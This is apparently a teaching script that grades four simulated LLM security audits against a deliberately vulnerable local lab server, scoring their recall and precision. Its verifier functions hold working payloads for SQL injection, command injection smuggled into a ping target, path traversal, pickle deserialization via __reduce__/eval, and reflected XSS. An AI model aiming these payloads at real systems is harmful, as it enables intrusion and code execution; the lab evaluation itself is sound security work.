#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
 evaluate_llm_audit.py — 以確定性裁判量測 LLM 審計的準確率
=============================================================================

 對應報告 CH06 S3「評估指標」與 CH02.1「發現與驗證分離」。

 設計動機（本練習的核心）：
   4 個獨立審計員（模擬 4 種不同的 LLM prompt 策略）對同一個目標做盲審。
   現在我們**不相信任何一份報告的文字**，而是對每個聲稱的漏洞
   實際送出攻擊輸入，觀察是否真的觸發。

   → 「發現」由 AI 負責；「判定真偽」由這段確定性程式碼負責。

 量測指標（依發現項而非 CWE 編號，避免去重爭議）：
   - Recall    ：6 個真實發現項中，報告抓到幾個
   - Precision ：報告的所有 finding 中，經驗證為真的有幾個
   - 漏報 / 誤報清單

 試運作紀錄（重要的實作教訓）：
   第一版裁判腳本對 F4（pickle）回報 false negative，
   原因是標記檔路徑指向一個**不存在的目錄**，導致伺服器端 open() 失敗。
   這不是漏洞不存在，而是**我的驗證腳本有 bug**。
   → 與 CH05「幻覺與誤報」互相印證：誤報與漏報都可能來自量測方式。

 用法：python evaluate_llm_audit.py <port>
=============================================================================
"""

import os
import pickle
import sys
import urllib.parse
import urllib.request

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8801
BASE = "http://127.0.0.1:%d" % PORT

LAB_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
FINDINGS_DIR = os.path.join(LAB_ROOT, "findings")


# ---------------------------------------------------------------------------
# 發現項定義
#   F1-F5：靶場作者刻意植入的 5 個漏洞
#   F6   ：同一個 CWE-79 出現在第二個端點（/hash），由 D 審計員獨立發現
#          → 它確實是獨立可觸發的漏洞，故列入 recall 分母
# ---------------------------------------------------------------------------
FINDINGS_DEF = [
    ("F1", "CWE-89", "/search", "SQL Injection"),
    ("F2", "CWE-78", "/ping", "OS Command Injection"),
    ("F3", "CWE-22", "/file", "Path Traversal"),
    ("F4", "CWE-502", "/import", "Insecure Deserialization"),
    ("F5", "CWE-79", "/hello", "Reflected XSS（/hello）"),
    ("F6", "CWE-79", "/hash", "Reflected XSS（/hash）"),
]
GROUND_TRUTH = [f[0] for f in FINDINGS_DEF]
FINDING_INFO = {f[0]: {"cwe": f[1], "endpoint": f[2], "desc": f[3]} for f in FINDINGS_DEF}

# 刻意設計為安全、且**未被任何 finding 觸及**的端點。
# 注意 /hash 不放進來：它的 algo 參數確實安全，但 v 參數有 XSS（F6），
# 因此把整個 /hash 視為「安全端點」會與 F6 互相矛盾。
DESIGNED_SAFE = ["/config", "/quote"]


def get(path: str) -> str:
    req = urllib.request.Request(
        BASE + path, headers={"User-Agent": "Judge/1.0"}
    )
    with urllib.request.urlopen(req, timeout=15) as r:
        return r.read().decode("utf-8", errors="replace")


# ---------------------------------------------------------------------------
# 逐項確定性驗證
# ---------------------------------------------------------------------------
def verify_f1() -> tuple:
    payload = "' OR '1'='1"
    raw = get("/search?q=" + urllib.parse.quote(payload))
    hit = "ADMIN_TOKEN_X9" in raw
    return hit, "q=%s → admin secret 外洩=%s" % (payload, hit)


def verify_f2() -> tuple:
    marker = "JUDGE_CMDI_MARKER"
    payload = "127.0.0.1 & echo " + marker
    raw = get("/ping?target=" + urllib.parse.quote(payload))
    hit = marker in raw
    return hit, "target=127.0.0.1 & echo <標記> → 標記出現=%s" % hit


def verify_f3() -> tuple:
    payload = "../audit_target.py"
    raw = get("/file?doc=" + urllib.parse.quote(payload))
    hit = "import hashlib" in raw or "InternalTools" in raw
    return hit, "doc=%s → 讀到 data/ 之外檔案=%s" % (payload, hit)


def verify_f4() -> tuple:
    """pickle：只寫一個標記檔（無害）。目錄必須存在，否則會假陰性。"""
    os.makedirs(FINDINGS_DIR, exist_ok=True)
    marker = os.path.join(FINDINGS_DIR, "judge_deser_marker.txt")
    if os.path.exists(marker):
        os.remove(marker)

    class Probe:
        def __reduce__(self):
            expr = (
                "open(r'%s','w',encoding='utf-8').write('JUDGE_DESER_OK')" % marker
            )
            return (eval, (expr,))

    raw_hex = pickle.dumps(Probe()).hex()
    get("/import?payload=" + urllib.parse.quote(raw_hex))
    hit = os.path.exists(marker)
    return hit, "pickle __reduce__ 執行 → 標記檔產生=%s" % hit


def verify_f5() -> tuple:
    payload = "<script>alert(1)</script>"
    raw = get("/hello?name=" + urllib.parse.quote(payload))
    hit = payload in raw
    return hit, "name 原樣反射=%s" % hit


def verify_f6() -> tuple:
    payload = "<script>alert('F6')</script>"
    raw = get("/hash?v=" + urllib.parse.quote(payload) + "&algo=md5")
    hit = payload in raw
    return hit, "/hash?v 原樣反射=%s" % hit


VERIFIERS = {
    "F1": verify_f1, "F2": verify_f2, "F3": verify_f3,
    "F4": verify_f4, "F5": verify_f5, "F6": verify_f6,
}

# ---------------------------------------------------------------------------
# 4 位審計員的報告（依其回報內容登錄）
# ---------------------------------------------------------------------------
AUDITS = {
    "A 自由審計": {
        "findings": ["F1", "F2", "F3", "F4", "F5", "CWE-209"],
        "claimed_safe": ["/config", "/quote", "/hash"],
        "uncertain": 4,
    },
    "B 變體分析": {
        "findings": ["F1", "F2", "F3", "F4", "F5"],
        "claimed_safe": ["/quote", "/hash"],
        "uncertain": 2,
    },
    "C CWE 清單掃描": {
        "findings": ["F1", "F2", "F3", "F4", "F5",
                     "CWE-798", "CWE-327", "CWE-200", "CWE-400"],
        "claimed_safe": ["/config", "/quote"],
        "uncertain": 0,
    },
    "D 嚴格審查": {
        "findings": ["F1", "F2", "F3", "F4", "F5", "F6"],
        "claimed_safe": ["/config", "/quote", "/hash"],
        "uncertain": 0,
    },
}

# 超出設計範圍的聲稱：逐項判定
EXTRA_VERDICT = {
    "CWE-209": {
        "is_true": True,
        "title": "例外訊息洩漏",
        "reason": "實測 /search?q=' 確實回顯 sqlite3 語法錯誤、/file?doc=不存在檔 回顯含絕對路徑的 FileNotFoundError。經執行驗證為真，是超出靶場設計的真實發現。",
    },
    "CWE-798": {
        "is_true": False,
        "title": "硬編碼憑證",
        "reason": "bootstrap() 的固定 token 是靶場種子資料，非部署憑證。列為獨立漏洞屬設計情境誤判。",
    },
    "CWE-327": {
        "is_true": False,
        "title": "弱雜湊演算法",
        "reason": "algo 有嚴格白名單，使用者只能從中挑選；一般校驗用途、無完整性驗證場景。屬過度推論（清單式 prompt 的典型誘導）。",
    },
    "CWE-200": {
        "is_true": False,
        "title": "資訊暴露",
        "reason": "與 F1（secret 外洩源於 SQLi）及 CWE-209（路徑洩漏源於例外回顯）重疊，屬重複計數。",
    },
    "CWE-400": {
        "is_true": False,
        "title": "資源耗用",
        "reason": "ThreadingHTTPServer 無連線上限屬設計層風險而非可直接觸發的漏洞；該審計員自身亦在別處標為 uncertain，屬過度列舉。",
    },
}


def main():
    print("=" * 80)
    print(" 以確定性裁判量測 LLM 審計準確率")
    print(" 目標：%s" % BASE)
    print(" 方法：不相信報告文字，逐一實際送出攻擊輸入並觀察是否觸發")
    print("=" * 80)

    try:
        get("/")
    except Exception as e:
        print("\n[錯誤] 無法連線 %s：%s" % (BASE, e))
        sys.exit(1)

    # --- 第一步：確定性驗證 ---
    print("\n【第一步】對 6 個 ground-truth 發現項實際驗證")
    print("-" * 80)
    verified = {}
    for fid, cwe, ep, desc in FINDINGS_DEF:
        try:
            hit, detail = VERIFIERS[fid]()
        except Exception as e:
            hit, detail = False, "驗證時發生例外：%s" % e
        verified[fid] = hit
        print("  %-3s %-9s %-28s %s" % (
            fid, cwe, desc, "✓ 已確認可觸發" if hit else "✗ 未觸發"))
        print("       %s" % detail)

    confirmed = [f for f in GROUND_TRUTH if verified.get(f)]
    print("\n  → 確定性驗證確認 %d/%d 個發現項真實存在" % (len(confirmed), len(GROUND_TRUTH)))
    false_neg = [f for f in GROUND_TRUTH if not verified.get(f)]
    if false_neg:
        print("  ⚠ 未通過驗證：%s" % ", ".join(false_neg))
        print("     注意：未通過可能是「目標沒漏洞」或「驗證腳本有 bug」，")
        print("     必須先排除後者（本次就發生過一次，見檔頭說明）。")

    # --- 第二步：評估各審計員 ---
    print("\n" + "=" * 80)
    print("【第二步】各審計員的準確率")
    print("=" * 80)
    print("%-16s %8s %8s %8s %10s %8s" % (
        "審計員", "Findings", "真陽性", "Recall", "Precision", "FalseNeg"))
    print("-" * 80)

    summary = {}
    for name, report in AUDITS.items():
        f = report["findings"]
        tp_gt = [x for x in f if x in GROUND_TRUTH and verified.get(x)]
        tp_extra = [x for x in f if x not in GROUND_TRUTH and EXTRA_VERDICT.get(x, {}).get("is_true")]
        tp = len(tp_gt) + len(tp_extra)
        recall = len(tp_gt) / len(GROUND_TRUTH)
        precision = tp / len(f) if f else 0.0
        missed = [x for x in GROUND_TRUTH if x not in f]
        fps = [x for x in f if x not in GROUND_TRUTH and not EXTRA_VERDICT.get(x, {}).get("is_true")]

        print("%-16s %8d %8d %7.0f%% %9.0f%% %8d" % (
            name, len(f), tp, recall * 100, precision * 100, len(missed)))
        summary[name] = {
            "findings": len(f), "tp": tp, "recall": recall, "precision": precision,
            "missed": missed, "fps": fps,
            "claimed_safe": report["claimed_safe"], "uncertain": report["uncertain"],
        }

    # --- 第三步：細節 ---
    print("\n" + "=" * 80)
    print("【第三步】逐項細節")
    print("=" * 80)
    for name, s in summary.items():
        print("\n▸ %s" % name)
        print("    Recall %.0f%% | Precision %.0f%% | uncertain %d 項" % (
            s["recall"] * 100, s["precision"] * 100, s["uncertain"]))
        print("    漏報：%s" % (", ".join(
            "%s(%s)" % (m, FINDING_INFO[m]["endpoint"]) for m in s["missed"]) or "無"))
        print("    誤報：%s" % (", ".join(
            "%s=%s" % (x, EXTRA_VERDICT.get(x, {}).get("title", "")) for x in s["fps"]) or "無"))
        print("    判定安全：%s" % (", ".join(s["claimed_safe"]) or "無"))

    # --- 第四步：誤報性質 ---
    print("\n" + "=" * 80)
    print("【第四步】超出設計範圍聲稱的性質分析")
    print("=" * 80)
    for key, v in EXTRA_VERDICT.items():
        print("\n  %s %s  [%s]" % (key, v["title"], "真陽性" if v["is_true"] else "誤報"))
        print("    %s" % v["reason"])

    # --- 第五步：安全端點判定 ---
    print("\n" + "=" * 80)
    print("【第五步】對「刻意設計為安全」的端點之判定")
    print("=" * 80)
    print("  設計為安全的端點：%s" % ", ".join(DESIGNED_SAFE))
    for name, s in summary.items():
        matched = [d for d in DESIGNED_SAFE if d in s["claimed_safe"]]
        print("    %-16s 正確判定 %d/%d 為安全（%s）" % (
            name, len(matched), len(DESIGNED_SAFE), ", ".join(matched) or "無"))

    # --- 結論 ---
    print("\n" + "=" * 80)
    print(" 結論")
    print("=" * 80)
    recall_vals = [s["recall"] for s in summary.values()]
    prec_vals = [s["precision"] for s in summary.values()]
    print("""
  1. Recall：4 位審計員為 %.0f%%–%.0f%%（6 個發現項中抓到 %d–%d 個）。
     全部漏掉的都是 F6（同一個 CWE-79 出現在第二個端點 /hash）。
     → 這是本次量測最重要的發現：**同一 CWE 在不同位置的第二個出現點
       是最常見的漏報來源**。三位審計員都只報了 /hello 的 XSS，
       只有採「逐項實測」策略的 D 額外發現 /hash?v 也有同樣問題。
     → 這正是 CH03 中 Big Sleep 選擇「變體分析」的理由：
       已修補的漏洞暗示同類問題可能存在於他處。

  2. Precision：%.0f%%–%.0f%%，差距主要來自 C（清單式 prompt）的 4 個誤報。
     關鍵觀察：**這些誤報不是幻覺（捏造不存在的漏洞）**，
     而是過度推論與重複計數：
       - CWE-798 把靶場種子資料當成部署憑證
       - CWE-327 由「有 md5 就算漏洞」的清單暗示誘導而來
       - CWE-200 / CWE-400 與既有 finding 重疊或屬設計層風險

  3. 清單式 prompt 的系統性偏差：C 的 prompt 是「逐項檢查 10 個 CWE」，
     這個清單本身暗示每一項都可能存在，於是它對 9 項都給出 present=true。
     → 對照 CH05「評價基準本身也可能被 gaming」：
       用清單式 prompt 會系統性地拉高誤報率。C 的 uncertain 為 0，
       也是同一個原因的表現（不確定性被清單壓力吸收了）。

  4. 唯一被判為真陽性的額外發現是 A 的 CWE-209（例外訊息洩漏），
     且經過實際執行驗證。→ 自由審計策略有機會撈到清單外的真實問題。

  5. 對照 CH02.1：4 份報告讀起來都很有說服力，但**沒有一項判定能靠閱讀確認**。
     只有執行（送出 payload、檢查回應與標記檔）才能區分
     真陽性、過度推論與重複計數。本腳本自己也曾因目錄路徑錯誤
     對 F4 給出假陰性——誤報與漏報都可能來自量測方式，不只是目標。
""" % (min(recall_vals) * 100, max(recall_vals) * 100,
       min(int(s["recall"] * len(GROUND_TRUTH)) for s in summary.values()),
       max(int(s["recall"] * len(GROUND_TRUTH)) for s in summary.values()),
       min(prec_vals) * 100, max(prec_vals) * 100))


if __name__ == "__main__":
    main()
